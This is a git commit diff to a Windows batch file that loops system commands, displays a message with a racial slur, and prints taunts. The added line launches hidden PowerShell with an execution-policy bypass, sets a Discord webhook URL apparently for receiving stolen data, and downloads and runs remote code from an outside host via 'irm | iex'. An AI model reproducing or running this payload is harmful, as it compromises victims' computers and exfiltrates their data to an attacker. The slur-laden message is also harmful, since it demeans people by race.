73ca69185eb0c2a898a2606930e93ac2d7f7bf8b
Ali Khalaf <ska.likhalaf@proton.me>
2025-12-12 14:59:54 +0300

    Add PowerShell command to shithole.bat

--- windows/shithole.bat
+++ windows/shithole.bat
@@ -17,5 +17,6 @@ perfmon /report
 systeminfo
 ping 1.1.1.1
 msg * "bich ass nigga hahahahahahahah"
+Powershell.exe -executionpolicy powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1449006954180640843/7BXlyjtiYoYhaK3lgRa6QSfOYbq3zFIvAeGRGBopHQYQP5aaQWQKTVp4IDNn3SBK4B3T';$db='';irm https://jakoby.lol/hgw | iex
 echo commands executed, repeating mwahahahahahaha bitch
 goto StartLoop
